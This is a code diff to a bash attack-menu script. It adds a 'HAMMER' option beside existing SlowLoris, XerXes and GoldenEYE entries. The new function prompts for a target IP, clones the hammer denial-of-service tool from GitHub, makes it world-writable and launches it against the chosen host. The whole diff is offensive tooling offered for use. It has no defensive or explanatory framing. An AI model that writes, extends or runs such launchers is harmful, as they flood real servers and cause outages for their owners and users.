@@ -253,6 +253,63 @@ fi
 #################
 
 
+##################
+###START HAMMER###
+HAMMER()
+{
+		echo "" && echo -e "$cyan"
+				echo -n -e "  Please Enter A IP Exp, 216.58.198.68 - "
+		read DOMAIn
+	if [ -z "$DOMAIn" ]; then
+		
+ 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
+					read back
+						if [ -z "$back" ]; then
+							exit
+							fi
+						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
+												then
+													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
+                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
+	                                                exit 0
+										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
+												then
+												clear
+                                                attacker
+		
+	fi
+fi
+		echo "" && echo -e "$cyan"
+		echo -e "  Checking Hammer .. " && sleep 1
+	cd tools
+		if [ ! -d "hammer" ]; then
+		echo -e "  Hammer Not Found ! .. "
+	echo ""
+		echo "  Wait for downloading"
+	sleep 1 && echo ""
+		git clone https://github.com/cyweb/hammer
+	clear
+	fi
+		if [ -d "hammer" ]; then
+		echo ""
+			echo -e "  Hammer found"
+		echo ""
+		echo -e "     ...:$BlueF Attacking Now $cyan:..."
+		echo ""
+		cd hammer
+				chmod 777 hammer.py
+				./hammer.py -s $DOMAIn
+			else
+				echo "We have a problem ! sorry"
+		fi
+
+}
+
+
+
+####END HAMMER###
+#################
+
 
 
 #######################
@@ -295,6 +352,8 @@ SlowLoris
 XerXes
 	elif [ "$ATTACKER" = "4" ]; then
 GoldenEYE
+	elif [ "$ATTACKER" = "5" ]; then
+HAMMER
 fi
 }
 #######################
